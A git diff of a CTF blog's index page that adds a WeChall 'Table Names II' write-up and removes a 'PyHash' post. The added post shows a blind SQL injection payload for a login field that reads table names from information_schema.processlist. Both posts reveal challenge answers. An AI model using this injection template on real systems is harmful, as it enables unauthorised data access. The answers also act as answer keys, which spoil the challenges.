@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">358</span>
+          <span class="site-state-item-count">359</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -375,6 +375,121 @@ p.spoiler {
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-table-names-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-table-names-2/" class="post-title-link" itemprop="url">WeChall - Table Names II</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2026-06-13 19:33:08 / Modified: 19:33:09" itemprop="dateCreated datePublished" datetime="2026-06-13T19:33:08+08:00">2026-06-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-table-names-2/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-table-names-2/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p>Table Names
+的进阶版。题目要求找出隐藏的数据库名和表名，答案格式是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">database_table</span><br></pre></td></tr></table></figure>
+<p>相比第一版，常规的 <code>information_schema.tables</code> /
+<code>database()</code> 路线会被过滤。</p>
+<h3 id="solution">Solution</h3>
+<p>后端查询大致是用隐藏配置拼出完整表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>secret_database<span class="operator">&gt;</span>.<span class="operator">&lt;</span>secret_table<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password<span class="operator">=</span><span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>不能直接查 <code>information_schema.tables</code> 时，可以转向
+<code>information_schema.processlist</code>。当前正在执行的 SQL
+文本会出现在 <code>processlist.info</code> 中，而这个 SQL 正好包含完整的
+<code>database.table</code>。</p>
+<p>盲注模板：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>test<span class="string">&#x27; OR IF(</span></span><br><span class="line"><span class="string">  (SELECT ASCII(SUBSTR(info, &lt;pos&gt;, 1)) = &lt;ord&gt;</span></span><br><span class="line"><span class="string">   FROM information_schema.processlist</span></span><br><span class="line"><span class="string">   WHERE info LIKE 0x2553454c45435425</span></span><br><span class="line"><span class="string">   LIMIT 1),</span></span><br><span class="line"><span class="string">  1,</span></span><br><span class="line"><span class="string">  0</span></span><br><span class="line"><span class="string">)#</span></span><br><span class="line"><span class="string">password=test</span></span><br></pre></td></tr></table></figure>
+<p>也可以用二分：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASCII(SUBSTR(info, <span class="operator">&lt;</span>pos<span class="operator">&gt;</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="operator">&lt;</span>mid<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+<p>逐字符恢复 <code>info</code> 后，从 SQL 文本里抽出
+<code>&lt;secret_database&gt;.&lt;secret_table&gt;</code>，再把点号换成下划线提交。</p>
+<p>通过 <code>SUBSTR(info,1,200)</code> 直接从 processlist
+提取完整查询文本，确认当前账号下数据库和表名为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nurfedtables37.userbobbytable7</span><br></pre></td></tr></table></figure>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">nurfedtables37_userbobbytable7</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -1495,126 +1610,6 @@ base 表示的等式。计算结果并以 solution base 表示提交。限时 3.
 内完成抓题→计算→提交</li>
 </ul>
 <p>答案 session-bound，每次不同，无法复用固定值。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-pyhash/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-pyhash/" class="post-title-link" itemprop="url">WeChall - PyHash</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-11 13:59:19 / Modified: 13:59:20" itemprop="dateCreated datePublished" datetime="2026-06-11T13:59:19+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-pyhash/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-pyhash/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>PyHash (Coding, Python) by gizmore 利用 CPython 大整数 hash
-的同余性质绕过哈希检查</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def fly_away(num: int) -&gt; bool:</span><br><span class="line">    return hash(num) == 31337</span><br></pre></td></tr></table></figure>
-<p>要求找一个整数参数使函数返回 <code>True</code>。题面注明测试环境是
-<strong>CPython 64-bit Python 3.10</strong>。</p>
-<h3 id="solution">Solution</h3>
-<p>CPython 对小整数有优化：<code>hash(n) == n</code>。所以直接传
-<code>31337</code> 的话，<code>hash(31337) == 31337</code>
-确实成立——但题面暗示要更大的整数，而且必须用 <code>int</code>，不是
-<code>float</code>。</p>
-<p>关键是大整数的 hash 实现。CPython 用一个固定 modulus 做折叠：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">P = sys.hash_info.modulus  <span class="comment"># 64-bit CPython: 2**61 - 1 = 2305843009213693951</span></span><br></pre></td></tr></table></figure>
-<p>对一个任意大整数 <code>x</code>，<code>hash(x)</code> 近似等于
-<code>x % P</code>（实际还有一步 murmur-style
-mixing，但对这个场景不重要）。因此构造一个与 <code>31337</code> 同余于
-<code>P</code> 的大整数即可：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">P = sys.hash_info.modulus</span><br><span class="line">candidate = <span class="number">31337</span> + P  <span class="comment"># 2305843009213725288</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>(candidate))  <span class="comment"># 31337</span></span><br></pre></td></tr></table></figure>
-<p>完整解法：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fly_away</span>(<span class="params">num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hash</span>(num) == <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">P = sys.hash_info.modulus          <span class="comment"># 2**61 - 1</span></span><br><span class="line">num = <span class="number">31337</span> + P                    <span class="comment"># 2305843009213725288</span></span><br><span class="line"><span class="keyword">assert</span> fly_away(num)               <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(num)                         <span class="comment"># 提交这个数</span></span><br></pre></td></tr></table></figure>
-<p>这个解依赖 CPython 实现细节和 64-bit 平台。32-bit CPython 的 modulus
-是 <code>2**31 - 1</code>，其他 Python implementation（PyPy,
-Jython）可能完全不同。在目标版本（CPython 3.10 64-bit）上验证通过。</p>
-<p>如果 <code>31337 + P</code> 已被别人提交过，就试
-<code>31337 + k * P</code>（k 为任意正整数）——所有同余值都有效。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">2305843009213725288（或 31337 + k * 2305843009213693951）</span></span>
 
       
     </div>
